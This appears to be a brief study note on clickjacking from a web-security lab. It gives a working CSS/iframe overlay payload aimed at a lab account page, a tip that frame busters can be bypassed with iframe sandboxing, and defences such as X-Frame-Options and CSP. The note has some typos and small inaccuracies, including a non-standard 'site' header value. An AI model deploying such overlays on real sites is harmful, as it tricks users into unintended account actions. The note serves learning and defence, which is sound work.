Click Jacking:

	Target website iframe is positioned within the browser so that there is a perscie overlap of the target action with the decoy website using appropriate width and height position values. Absolute and relative values are used to ensure that the target website accurately overlaps the decoy regardless of screen size, opacity value is defined as 0.0 so that the iframe content is transparent

"<style>
   iframe {
       position:relative;
       width: 500px;
       height: 700px;
       opacity: 0.0001;
       z-index: 2;
   }
   div {
       position:relative;
       top: 600px;
       left: 60px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://aca61f401fcdc06a80fe1e5300ba00df.web-security-academy.net/my-account"></iframe>"

modern browser use frame buster scripts to find invisble frames and other potentaial clickjacking, but most of it can be bypassed by using iframe sandbox feature, that allows scripts and forms with getting caught

X-Frame-options: deny or same-origin or site 

can tell the browser if it has to include iframes

content-security-policy can also be used as another layer of protection


